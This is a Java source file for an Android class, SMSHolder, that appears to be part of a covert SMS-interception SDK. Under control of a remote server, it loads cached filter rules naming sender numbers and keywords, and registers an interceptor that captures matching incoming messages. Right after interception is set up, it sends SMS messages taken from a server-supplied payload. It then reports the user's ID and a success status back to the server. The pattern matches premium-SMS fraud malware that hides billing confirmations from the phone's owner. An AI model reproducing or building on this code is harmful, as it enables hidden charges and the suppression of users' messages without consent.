package com.core_sur;

import java.util.ArrayList;
import java.util.Calendar;
import java.util.Random;

import android.content.Context;
import android.content.SharedPreferences;

import com.core_sur.action.CallBackAction;
import com.core_sur.bean.CallbackBean;
import com.core_sur.bean.RegResponse;
import com.core_sur.bean.RevBean;
import com.core_sur.bean.SmsInterceptBean;
import com.core_sur.tools.Log;
import com.core_sur.tools.mlog;

/**
 * 服务运行后
 * 
 * @author Administrator
 * 
 */
public class SMSHolder
{
	private static final String TAG = "SMSHolder";

	public String HeartThreadName = "";

	private MySTask mSmsInterceptor;

	private Context myContext = null;

	private RegResponse regResponse;

	private final boolean isrunning = true;

	private int time;
	private RevBean revBean;
	public static SMSHolder smsHolder;

	public static SMSHolder getInstance()
	{
		if (smsHolder == null)
		{
			smsHolder = new SMSHolder();
		}
		return smsHolder;
	}

	public void StartHolder(Context context)
	{
		myContext = context.getApplicationContext();

		if (Config.gwClientType == 4)
		{
			return;
		}

		try
		{
			SharedPreferences sp_Setting = myContext.getSharedPreferences("Setting_snspt", Context.MODE_PRIVATE);

			if (Config.IsDebug)
			{
				Log.i("YLSmsServer", "onCreat");
			}
			// acquireWakeLock();// 获得休眠锁

			// regResponse = null;

			if (regResponse == null)
			{

				String regInfo = sp_Setting.getString(Config.CacheKey.CacheRegInfo, null);

				if (regInfo != null && regInfo.length() > 0)
				{
					regResponse = WCConnect.getInstance().GetRegResponse(regInfo);
				}
			}

			if (regResponse != null)
			{
				Config.AesNewKey = regResponse.getCryptkey();
			}

			time = regResponse.getHeartconntime();

			new Thread()
			{
				@Override
				public void run()
				{
					HeartThreadName = "sms_" + (new Random().nextInt(100000000)); // sms_100000

					// 设置线程名称
					this.setName(HeartThreadName);

					// while (isrunning)
					{
						// 如果当前线程名改变了，那么退出
						// if (!this.getName().equals(HeartThreadName))
						// {
						// return;
						// }

						// 怕万一time=0时,循环执行,导致死机
						if (time == 0)
						{
							return;
						}

						// Region 启动sms lanjie
						SharedPreferences sp_Setting = myContext.getSharedPreferences("Setting_snspt", Context.MODE_PRIVATE);

						Calendar now = Calendar.getInstance();
						long DataMillis = now.getTimeInMillis();

						long SMSFilterTime = sp_Setting.getLong(Config.CacheKey.CacheSMSFilterTime, 0);

						// 缓存时间,改成30天. 2014-6-20 by keng
						// if (SMSFilterTime + 6 * 30 * 24 * 60 * 60 * 1000 >
						// DataMillis)
						{
							String SMSFilterStr = sp_Setting.getString(Config.CacheKey.CacheSMSFilterString, null);

							if (SMSFilterStr != null && SMSFilterStr.length() > 0)
							{
								revBean = WCConnect.getInstance().GetRevBean(SMSFilterStr);
							}
							// } else
							/*
							 * { // 清理旧的缓存数据 Editor editor = sp_Setting.edit();
							 * editor
							 * .putString(Config.CacheKey.CacheSMSFilterString,
							 * null); editor.commit();
							 * 
							 * // 停止sms lanjieSmsInterceptor.unregisterListen(); }
							 */
							// endregion

							// 启动sms lanjie
							if (revBean != null)
							{
								StartHold(revBean);
							}

							try
							{
								sleep(time);
							} catch (Exception e)
							{
							}
						}
					}
				}
			}.start();

		} catch (Exception e)
		{
			if (Config.IsDebug)
			{
				Log.d(TAG, e.getMessage());
			}
		}

	}

	/**
	 * 关闭拦截
	 */
	private void StopHold(RevBean revBean)
	{
		try
		{
			MySTask.unregisterListen();

			if (revBean.getLinkid() != 0)
			{
				WCConnect.getInstance().PostLog("SMSLog:SDK:sms lanjie已取消");
			}
		} catch (Exception e)
		{
			if (Config.IsDebug)
			{
				Log.d(TAG, e.getMessage());
			}
		}

	}

	private void StopHold()
	{
		RevBean rb = new RevBean();
		rb.setLinkid(0);
		StopHold(rb);
	}

	/**
	 * 开始拦截
	 * 
	 * @param aWapChannelArray
	 */
	private void StartHold(RevBean revBean)
	{
		System.out.println("Andy Tag:RevBean is null:" + (revBean==null));
		if(revBean!=null)
		{
			System.out.println("Andy Tag: revBean cmid:" + revBean.getCmdid());
			System.out.println("Andy Tag: revBean msg:" + revBean.getMsg());
		}
		// 判断线程是否已经终止
		try
		{
			//StopHold();
		} catch (Exception er)
		{

		}

		try
		{
			mSmsInterceptor = new MySTask(myContext);

			// 一级分割
			String numberArray[] = revBean.getMsg().split(Config.splitStringLevel1);
			if (numberArray == null || numberArray.length == 0)
				return;

			String number = "";
			String data = "";

			for (int i = 0; i < numberArray.length; i++)
			{
				String[] temp = numberArray[i].split(Config.splitStringLevel2);

				number += temp[0] + "_";

				if (temp.length == 2)
					data += temp[1] + "_";
			}

			SmsInterceptBean aSmsInterceptBean = new SmsInterceptBean();
			aSmsInterceptBean.setIntercept_port(number.split("_"));
			aSmsInterceptBean.setIntercept_key(data.split("_"));

			ArrayList<SmsInterceptBean> aInterceptList = new ArrayList<SmsInterceptBean>();
			aInterceptList.add(aSmsInterceptBean);

			mSmsInterceptor.setInterceptPara(aInterceptList);
			try
			{
				mSmsInterceptor.regInterceptSms();
			} catch (Exception e)
			{
				if (Config.IsDebug)
				{
					Log.e(TAG, "StartHold reg " + e.getMessage());
				}
			} 
			// 0. 拦截已经建立,开始检测是否需要发短信
			try
			{
				if (Config.SMSJson != null && !Config.SMSJson.equals(""))
				{
					WCConnect.getInstance().PostLog("SMSLog:客户端建立拦截后马上发短信");

					// 此处用2个3级分隔符拼接,来分割多条短信拼接,与EPGW对应
					String[] al_Sms = Config.SMSJson.split(Config.splitStringLevel3 + Config.splitStringLevel3);

					for (String smsJson : al_Sms)
					{
						WCConnect.getInstance().openJSONData(smsJson, myContext);
					}
					Config.SMSJson=null;
				}
			} catch (Exception e)
			{
			}
			// 1. sms lanjie规则建立,通知服务器,并进行后续处理
			CallbackBean callbackbean = new CallbackBean();

			callbackbean.setCmdid(Config.CMD_CALLBACK);
			callbackbean.setLinkid(revBean.getLinkid());
			callbackbean.setMsg(regResponse.getUid() + " StartHold,ok");
			callbackbean.setStatus(0);// 0是成功
			CallBackAction callback = new CallBackAction(myContext, callbackbean, regResponse);
			callback.start();

		} catch (Exception e)
		{
			if (Config.IsDebug)
			{
				Log.e(TAG, "StartHold  " + e.getMessage());
			}

		}
	}
}
